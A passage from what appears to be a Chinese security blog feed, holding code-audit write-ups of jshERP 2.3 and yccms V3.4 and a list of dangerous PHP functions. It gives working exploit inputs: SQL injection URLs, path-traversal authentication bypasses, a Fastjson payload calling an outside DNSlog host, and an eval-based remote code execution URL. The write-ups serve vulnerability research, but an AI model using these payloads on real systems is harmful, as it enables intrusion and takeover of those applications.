&#125;<br></code></pre></td></tr></table></figure></li><li><p>再到<code>select</code></p><p>到这里，变成了两个参数控制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(apiName)) &#123;<br>        <span class="hljs-keyword">return</span> container.getCommonQuery(apiName).select(parameterMap);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>这个select 在往上找，就来到了最后的controller 层</p><p>jshERP-2.3\src\main\java\com\jsh\erp\controller\ResourceController.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165030075.png" alt="image-20250823235517735"></p></li><li><p>查找apiName是什么？？</p><p>寻找apiName从哪里传入，输入get(apiName)查找</p><p>jshERP-2.3\src\main\java\com\jsh\erp\service\CommonQueryManager.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165031978.png" alt="image-20250824000024856"></p><p>说明：<code>apiName</code>的值会从<code>configComponentMap</code>这个变量中获取，而这个变量在<code>init</code> 函数中被put 压入数据。</p><p>具体的内容是：service下每个文件夹对应一个apiName</p><p>而我们一开始回溯搜索的<code>selectByConditionUnit</code>实现方法就是在<code>service\unit\UnitService.java</code>，所以这里我们需要的apiName 的值就是unit</p><p>而且需要传入参数有三个：<code>pageSize</code>、<code>currentPage</code>、<code>search</code></p></li><li><p>整理:</p><p>两个点：</p><ul><li><p>第一个传入json：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>：<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8080</span>/unit/list?search=/unit/list?search=%<span class="hljs-number">7</span>B%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>jsh%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>%<span class="hljs-number">3</span>D1--%<span class="hljs-number">2</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>D&amp;pageSize=<span class="hljs-number">10</span>&amp;currentPage=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;currentPage=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>第二个点利用apiname——&gt;unit：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>：<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8080</span>/unit/list?pageSize=&amp;currentPage=&amp;search=jsh&#x27; and sleep(<span class="hljs-number">3</span>)--+<br></code></pre></td></tr></table></figure></li></ul></li><li><p>应该是先走第一个</p><p>所以payload是传入json的内个</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165034376.png" alt="image-20250824002710881"></p><h2 id="权限校验"><a href="#权限校验" class="headerlink" title="权限校验"></a>权限校验</h2><h3 id="包含特定路径可绕过过滤器"><a href="#包含特定路径可绕过过滤器" class="headerlink" title="包含特定路径可绕过过滤器"></a>包含特定路径可绕过过滤器</h3><ol><li><p>当URL中包含<code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>则放行数据包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>            requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure></li><li><p>构建路径<code>/doc.html/..</code> 再加上正常访问的路径，<code>/doc.html/..</code> 会返回根路径，再加上正常访问路径即可正常访问各功能点</p></li><li><p>正常登录返回两个数据包（先返回一个post，提交之后会返回一个get）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165036442.png" alt="image-20250824003549637"></p></li><li><p>删除登录后的Cookie中的session信息的数据包，返回302重定向代码，返回login.html</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165038106.png" alt="image-20250824003612455"></p></li><li><p>加入越权Payload后的数据包，获取信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165039947.png" alt="image-20250824003654566"></p></li></ol><h3 id="verify-验证可绕过过滤器"><a href="#verify-验证可绕过过滤器" class="headerlink" title="verify()验证可绕过过滤器"></a>verify()验证可绕过过滤器</h3><ol><li><p>一开始定义了要忽略的文件名后缀，包括：<code>.css</code>、<code>.js</code>、<code>.jpg</code>、<code>.png</code>、<code>.gif</code>、<code>.ico</code>文件，之后传递到初始化方法中，生成<code>ignoredList</code>列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">        initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">                      @WebInitParam(name = &quot;filterPath&quot;,</span><br><span class="hljs-meta">                              value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>verify()</code>方法进行验证，根据代码判断，当访问的文件后缀在<code>ignoredList</code>中，就放行数据包</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165041609.png" alt="image-20250823224849701"></p></li><li><p>构建poc</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">/a.css/..`，后面再加上正常访问的路径即可<br></code></pre></td></tr></table></figure></li><li><p>同上直接构建payload越权获取用户信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165043428.png" alt="image-20250824003817616"></p></li></ol><h3 id="使用特定路径前缀可绕过过滤器"><a href="#使用特定路径前缀可绕过过滤器" class="headerlink" title="使用特定路径前缀可绕过过滤器"></a>使用特定路径前缀可绕过过滤器</h3><ol><li><p>一开始定义了些允许访问的路径前缀：<code>/user/login</code>、<code>/user/registerUser</code>、<code>/v2/api-docs</code>，初始化方法中把运行访问路径生成<code>alowUrls</code>列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">        initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">                      @WebInitParam(name = &quot;filterPath&quot;,</span><br><span class="hljs-meta">                              value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)</span><br></code></pre></td></tr></table></figure></li><li><p>对URL进行判断，若使用的路径开头在<code>allowUrls</code>列表中，则放行数据包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>判断方法中使用startsWith()方法进行验证，可以使用目录穿越的方式进行绕过，构建Payload路径：<code>/user/login/../..</code> ，后面再添加正常访问路径即可</p></li><li><p>同上直接在数据包搞payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165045737.png" alt="image-20250824003846664"></p></li></ol><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ol><li><p>在前端html 目录中搜索有关<code>/add</code> 增加的功能页</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165049113.png" alt="image-20250825001033863"></p></li><li><p>有一个增加用户的功能点，先增加一个用户</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165051098.png" alt="image-20250825001210544"></p></li><li><p>然后修改用户名</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165052176.png" alt="image-20250825001418935"></p></li><li><p>成功弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165054113.png" alt="image-20250825001355332"></p></li><li><p>但有一个前提是拥有登陆后台的高权限</p></li></ol><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><ol><li><p>查看user相关代码，发现登录功能没有对登录次数进行限制，也没有验证码验证</p><p>\jshERP-2.3\src\main\java\com\jsh\erp\datasource\entities\User.java</p></li><li><p>这是用户登录的代码jshERP-2.3\src\main\java\com\jsh\erp\controller\UserController.java</p><p>可以进行暴力用户名、密码测试</p></li><li><p>查看登录数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /user/login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.137.242:8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">142</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">142</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/json, text/javascript, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">55</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.137.242:8080</span><br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.137.242:8080</span>/login.html<br><span class="hljs-attribute">Cookie</span>: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="hljs-number">1755958707</span>,<span class="hljs-number">1755966272</span>,<span class="hljs-number">1755966567</span>,<span class="hljs-number">1756050714</span>; JSESSIONID=<span class="hljs-number">3</span>BC51C24F7937AAE005C1EEF190EBC9E; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="hljs-number">1756053268</span>; HMACCOUNT=BDACAAE04DCF04BE<br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span><br><br><span class="hljs-attribute">loginName</span>=jsh&amp;password=e10adc3949ba59abbe56e057f20f883e//这是账号密码<br></code></pre></td></tr></table></figure></li><li><p>可以看到密码加密了（根据密码加密格式可以猜测为md5）（也可以去跑ai）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165150570.png" alt="image-20250825003652031"></p></li><li><p>而且在userservice也发现MD5加密的注释</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165059147.png" alt="image-20250825003754355"></p></li><li><p>所以可以使用bp的插件，根据字典进行爆破（<strong>记得勾选MD5的加密哈</strong>）</p><p>这里我就偷个小懒，不具体演示了哈</p></li></ol><h2 id="Fastjson反序列化漏洞"><a href="#Fastjson反序列化漏洞" class="headerlink" title="Fastjson反序列化漏洞"></a>Fastjson反序列化漏洞</h2><ol><li><p>扫描<code>pom.xml</code>文件时发现存在1.2.55 版本Fastjson的，上面说过，这个版本是存在反序列化漏洞的版本</p></li><li><p>直接搜索<code>parseObject(</code>关键字 ; 或者换一种思路，直接寻找上面 SQL 注入的一样的<code>search</code></p><p><strong>注意：</strong>这里反序列化的地方很多，我们要去找的地方一定是要输入可控的。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165101586.png" alt="image-20250825004159390"></p></li><li><p>定位到<code>StringUtil</code>类文件，其中的静态方法<code>getInfo</code>调用了<code>JSONObject.parseObject()</code>方法，传递的参数是<code>search</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>            value = obj.getString(key);<br>            <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                value = <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>查看<code>getInfo</code>方法的使用情况，发现之前查看过的<code>PersonComponent</code>类(巧了，就是之前审计的sql的代码)</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165103672.png" alt="image-20250825004946970"></p></li><li><p>查看<code>PersonComponent</code>类文件，<code>getPersonList()</code>方法调用了<code>StringUtil.getInfo()</code>方法，参数也是search中获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getPersonList(Map&lt;String, String&gt; map) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;type&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>        <span class="hljs-keyword">return</span> personService.select(name, type, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>后面就和上面SQL注入时分析的一样，漏洞点路径就应该是<code>/person/list?search=</code></p><p>和之前一样</p><ul><li><p>先搭建在公⽹VPS上搭建FakeMysql服务器</p></li><li><p>发送数据包后，我们的smartBi服务器尝试连接fakeMysql服务器，通过反序列化即可成功执⾏命令</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165105542.png" alt="image-20250812181350575"></p></li><li><p>不多废话，直接展示payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;3.b3925eed5a.ipv6.1433.eu.org&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://lusensec.github.io/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020235518738.png" alt="image-20241020235518738"></p><p>ok，完事。</p></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php高危</title>
    <link href="/2025/10/27/php%E9%AB%98%E5%8D%B1/"/>
    <url>/2025/10/27/php%E9%AB%98%E5%8D%B1/</url>
    
    <content type="html"><![CDATA[<ul><li><p>yes 需要  no 不需要</p></li><li><p>文件类型操作</p></li><li><ul><li>file() 函数读取整个文件</li><li>fgets() 读取一行数据</li><li>fgetc() 读取一个字符</li><li>fwrite()函数  可以进行文件写入操作</li><li>file_put_contentt()函数 可以对文件进行写入操作</li><li>file_get_contents()函数 可以进行读取文件 yes</li><li>unlink() 函数  进行文件的删除</li><li>rmdir() 直接删除一个目录</li><li>tempanam() 创建一个临时文件</li><li>tmofile() 创建一个临时文件</li><li>fopen() 函数 打开或者远程读取一个url</li><li>readfile() 输出一个文件</li><li>fread() 读取里面文件，no</li><li>rename 重命名一个文件</li><li>fputs  文件上传类似于fwrite</li></ul></li><li><p>其他 </p></li><li><ul><li><p>目录遍历</p></li><li><ul><li><p>opendir()</p></li><li><p>readdir()</p></li><li><p>closedir() </p></li><li><ul><li>函数都会导致一个目录遍历</li></ul></li></ul></li></ul></li><li><p>命令执行函数</p></li><li><ul><li>exec() 函数 执行命令       yes</li><li>system() 函数    no</li><li>shell_exec() 函数 执行命令              yes</li><li>passthru()函数 执行命令类似于exec      no</li><li>preg_replace()函数 执行命令但是需要&#x2F;e模式</li><li>escapeshellcmd()函数</li><li>popen() 此函数需要写入一个文本当中 &gt; D:&#x2F;1.txt’, ‘r’ ); ?&gt;</li><li>proc_open()</li><li>pcntl_exec()   也是写入一个文件当中pcntl_exec( “&#x2F;bin&#x2F;bash” , array(“whoami”));</li><li>create_funtion()</li><li>array_map()</li></ul></li><li><p>文件包含</p></li><li><ul><li>require()</li><li>include()</li><li>require_once()</li><li>include_once()</li></ul></li><li><p>SSRF漏洞</p></li><li><ul><li>curl_exec()  </li><li>file_get_content()  在内容当中参数可控可以进行SSRF漏洞读取</li><li>fopen()  </li><li>fsockopen()</li></ul></li><li><p>变量覆盖</p></li><li><ul><li>$$</li></ul></li><li><p>反序列化</p></li><li><ul><li>unserialize反序列化函数，参数可控，存在可利用类和魔术方法</li><li>serialize</li></ul></li><li><p>文件下载</p></li><li><ul><li>header(‘Content-Disposition: attachment; filename&#x3D;’.$filename);</li></ul></li><li><p>URL跳转</p></li><li><ul><li>header(“Location:</li></ul></li></ul><p><a href="http://www.baidu.com/">http://www.baidu.com</a>“)</p><ul><li><p>XML外部实体加载</p></li><li><ul><li>PHP XML解析函数</li><li>simplexml_load_file</li><li>simplexml_load_string</li><li>SimpleXMLElement</li></ul></li><li><ul><li>DOMDocument</li><li>xml_parse</li></ul></li><li><p>正则表达式小技巧</p></li><li><ul><li>file_get_contents($this-&gt;([a-zA-Z0-9]+)</li><li>适用于pop链分析</li></ul></li><li><p>文件上传</p></li><li><ul><li><p>$_file[‘file’][‘name’]   客户端上传的原名称</p></li><li><p>$_file[‘file’][‘type’]   文件·类型</p></li><li><p>$_file[‘file’][‘size’]     文件大小</p></li><li><p>$_file[‘file’][‘tmp_name’]    文件上传之后在服务器临时存储的名称</p></li><li><p>$_file[‘file’][‘error’]   上传之后产生的错误代码</p></li><li><ul><li>最终 move_upload_file  进行文件移动</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms V3.4审计</title>
    <link href="/2025/10/27/yccms%20V3.4%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/yccms%20V3.4%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><p>通过网盘分享的文件：yccms.rar</p><p>链接: <a href="https://pan.baidu.com/s/1f6kZlcEFdnrubGlUKvT8iw">https://pan.baidu.com/s/1f6kZlcEFdnrubGlUKvT8iw</a> 提取码: fw2i</p><p>全局搜索查询版本（define(‘VERSION’, ‘Ver 3.4’);&#x2F;&#x2F;程序版本）</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="1（rce）"><a href="#1（rce）" class="headerlink" title="1（rce）"></a>1（rce）</h3><p>&#x2F;public&#x2F;class&#x2F;Factory.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Factory</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">private</span> <span class="hljs-variable">$_obj</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>以get输入得到a</p><p>​file_exists（检查文件或目录是否存在，并返回布尔值）  函数检测<br>​ucfirst():将字符串的首字母转换为大写</p></li><li><p>绕过file_exists</p><p>​该函数允许目录存在特殊字符，&#x2F;..&#x2F;将第一个前的内容当作一个目录处理，本身会返回上一个目录（造成了中间字符的逃逸）</p><p>​构造Factory();phpinfo();&#x2F;&#x2F;..&#x2F;,第一个<strong>F</strong>actory用来闭合前面实例化对象，之后就是插入的恶意代码，最后返回上级目录满足目录存在。（<strong>F</strong>actory首字母已经大写）</p></li><li><p>寻找该类在哪被加载（run）</p><p>​config&#x2F;run.inc.php（类的实例化）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//单入口</span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>但是</strong>config&#x2F;run.inc.php文件无法直接访问</p><p>​继续找包含了这个文件的其他可用文件，找到admin&#x2F;index.php、config&#x2F;count.php、search&#x2F;index.php三个文件</p><p>​由于index.php是默认的首页文件，所以通过admin&#x2F;index.php  search&#x2F;index.php 进行利用时可以省略index.php</p></li><li><p>构造</p><p>&#x2F;admin?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;&#x2F;admin&#x2F;index.php?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;<br>&#x2F;search?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;&#x2F;search&#x2F;index.php?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</p><p>​   &#x2F;config&#x2F;count.php?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</p><p>虽然search&#x2F;index.php未直接调用Factory::setAction()，其他的执行的项目中存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_tpl</span>=TPL::<span class="hljs-title function_ invoke__">getInstance</span>();<br><span class="hljs-variable">$_search</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchAction</span>();<br><span class="hljs-variable">$_search</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br></code></pre></td></tr></table></figure><p><del>&#x2F;config?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</del></p><p>因为   &#x2F;config?a&#x3D;…→ 并没有 index.php 或没有对应处理逻辑，可能返回 403 或静态内容</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/admin</span>?a=<span class="hljs-string">...</span>` → 路由到 `<span class="hljs-string">/admin/index.php</span><br><span class="hljs-string">/search</span>?a=<span class="hljs-string">...</span>` → 路由到 `<span class="hljs-string">/search/index.php</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="2（未授权管理员密码修改）"><a href="#2（未授权管理员密码修改）" class="headerlink" title="2（未授权管理员密码修改）"></a>2（未授权管理员密码修改）</h3><p>controller&#x2F;AdminAction.class.php（update函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 